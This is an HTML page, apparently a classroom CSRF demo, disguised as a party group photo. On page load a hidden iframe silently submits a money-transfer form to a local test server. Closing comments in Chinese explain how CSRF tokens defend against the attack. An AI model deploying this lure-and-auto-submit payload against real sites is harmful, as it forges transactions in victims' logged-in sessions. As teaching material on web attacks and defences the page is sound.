<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>聚会合照</title>
    <script src="http://code.jquery.com/jquery-2.1.1.min.js"></script>

</head>
<body>
<iframe src="" frameborder="0" id="hack" style="width: 0;height: 0">

</iframe>
<img src="http://cms-bucket.nosdn.127.net/312e057a25f148519dc02b40812c78fe20170510155251.gif" alt="" width="100%" height="100%">
<div id="box" style="width: 0;height: 0">
    <form action="http://127.0.0.1:9000/transfer/" method="post" id="myform">
        <input type="text" name="email" value="test@qq.com">
        <input type="text" name="money" value="100">
    </form>
</div>


<script>
    window.onload = function () {
        $('#hack').contents().find('html').html($('#myform'));
        $('#hack').contents().find('html').children('#myform').submit();
    }
</script>
{#服务器验证表单中的csrftoken跟  cookie中的csrftoken是否一致#}
{#如果不一致 拒绝请求#}
{#如果黑客想要爬虫获取 表单中的csrftoken 但是每次都是随机的#}
{#即使你拿到了表单中的csrftoken 但是 cookie中的不太好伪造#}
{#百度网站不可能操作新浪网站的  cookie#}
</body>
</html>
